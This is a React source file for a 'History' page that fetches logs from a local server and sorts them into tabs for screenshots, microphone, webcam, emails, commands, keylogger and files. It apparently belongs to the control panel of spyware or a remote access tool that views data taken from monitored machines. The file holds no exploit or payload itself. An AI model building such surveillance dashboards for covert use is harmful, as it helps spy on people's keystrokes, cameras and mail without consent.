import React, { useState, useEffect } from 'react';
import axios from 'axios';
import {
  AppBar, Toolbar, Typography, Container, Paper, List, ListItem, ListItemText, CircularProgress, Tabs, Tab, Box
} from '@mui/material';

const SERVER_URL = 'http://localhost:5000';

const HistoryPage = () => {
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [selectedCategory, setSelectedCategory] = useState(0);

  useEffect(() => {
    fetchHistory();
  }, []);

  const fetchHistory = async () => {
    setLoading(true);
    try {
      const response = await axios.get(`${SERVER_URL}/history`);
      setHistory(response.data.history);
    } catch (error) {
      setError('Error fetching history data');
    }
    setLoading(false);
  };

  const handleCategoryChange = (event, newValue) => {
    setSelectedCategory(newValue);
  };

  const categorizeLogs = (logs) => {
    const categories = {
      Screenshots: [],
      Microphone: [],
      Webcam: [],
      Emails: [],
      Commands: [],
      Keylogger: [],
      Files: []
    };

    logs.forEach(log => {
      if (log.type in categories) {
        categories[log.type].push(log);
      }
    });

    return categories;
  };

  const categorizedLogs = categorizeLogs(history);

  return (
    <div>
      <AppBar position="static" style={{ backgroundColor: 'blue' }}>
        <Toolbar>
          <Typography variant="h6" style={{ flexGrow: 1, color: 'white' }}>History</Typography>
        </Toolbar>
      </AppBar>
      <Container style={{ marginTop: '20px' }}>
        {loading ? (
          <div style={{ textAlign: 'center' }}>
            <CircularProgress />
          </div>
        ) : error ? (
          <Typography variant="body1" color="error" align="center">
            {error}
          </Typography>
        ) : (
          <div>
            <Tabs
              value={selectedCategory}
              onChange={handleCategoryChange}
              centered
              style={{ marginBottom: '20px' }}
            >
              <Tab label="Screenshots" />
              <Tab label="Microphone" />
              <Tab label="Webcam" />
              <Tab label="Emails" />
              <Tab label="Commands" />
              <Tab label="Keylogger" />
              <Tab label="Files" />
            </Tabs>
            <TabPanel value={selectedCategory} index={0}>
              <LogList logs={categorizedLogs.Screenshots} />
            </TabPanel>
            <TabPanel value={selectedCategory} index={1}>
              <LogList logs={categorizedLogs.Microphone} />
            </TabPanel>
            <TabPanel value={selectedCategory} index={2}>
              <LogList logs={categorizedLogs.Webcam} />
            </TabPanel>
            <TabPanel value={selectedCategory} index={3}>
              <LogList logs={categorizedLogs.Emails} />
            </TabPanel>
            <TabPanel value={selectedCategory} index={4}>
              <LogList logs={categorizedLogs.Commands} />
            </TabPanel>
            <TabPanel value={selectedCategory} index={5}>
              <LogList logs={categorizedLogs.Keylogger} />
            </TabPanel>
            <TabPanel value={selectedCategory} index={6}>
              <LogList logs={categorizedLogs.Files} />
            </TabPanel>
          </div>
        )}
      </Container>
    </div>
  );
};

const LogList = ({ logs }) => (
  <Paper style={{ padding: '20px', marginBottom: '20px', backgroundColor: 'white', color: 'black' }}>
    <Typography variant="h5" gutterBottom>Logs</Typography>
    <List>
      {logs.length === 0 ? (
        <Typography variant="body1" color="textSecondary">No logs available.</Typography>
      ) : (
        logs.map((log, index) => (
          <ListItem key={index}>
            <ListItemText primary={log.message} secondary={log.timestamp} />
          </ListItem>
        ))
      )}
    </List>
  </Paper>
);

const TabPanel = (props) => {
  const { children, value, index, ...other } = props;
  return (
    <div
      role="tabpanel"
      hidden={value !== index}
      id={`tabpanel-${index}`}
      aria-labelledby={`tab-${index}`}
      {...other}
    >
      {value === index && (
        <Box p={3}>
          {children}
        </Box>
      )}
    </div>
  );
};

export default HistoryPage;
